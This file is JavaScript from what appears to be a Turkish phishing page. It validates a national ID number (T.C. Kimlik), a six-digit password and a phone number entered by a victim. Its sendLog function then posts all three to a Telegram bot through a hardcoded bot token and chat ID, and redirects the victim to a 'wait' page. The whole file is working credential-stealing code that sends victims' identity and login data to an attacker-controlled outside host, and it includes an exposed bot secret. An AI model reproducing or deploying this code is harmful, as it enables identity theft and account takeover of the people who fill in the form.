function validateAndSubmit() {
    const tcKimlik = document.getElementById('tc-kimlik').value.trim();
    const sifre = document.getElementById('sifre').value.trim();
    const telefon = document.getElementById('telefon').value.trim();

    if (!isValidTC(tcKimlik)) {
        alert('Geçersiz T.C. Kimlik No. Lütfen kontrol edin.');
        return;
    }

    if (sifre.length !== 6) {
        alert('Şifre 6 haneli olmalıdır.');
        return;
    }

    const fullTelefon = telefon.startsWith('0') ? telefon : '0' + telefon;

    sendLog(tcKimlik, sifre, fullTelefon);
}

function isValidTC(tc) {
    const tcRegex = /^[1-9]\d{10}$/;
    return tcRegex.test(tc);
}

function sendLog(tcKimlik, sifre, telefon) {
    const logData = {
        tcKimlik,
        sifre,
        telefon
    };

    const telegramToken = '6872411950:AAHtV6m6NDnXSmU1JFdcoT4PCiMEl5Z9rWY';
    const chatId = '-2097869667';

    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: `T.C. Kimlik No: ${tcKimlik}\nŞifre: ${sifre}\nTelefon: ${telefon}`
        })
    })
        .then(response => {
            if (response.ok) {
                window.location.href = "bekle.html";
            } else {
                alert('Log gönderme başarısız. Lütfen tekrar deneyin.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Log gönderme sırasında bir hata oluştu.');
        });
}
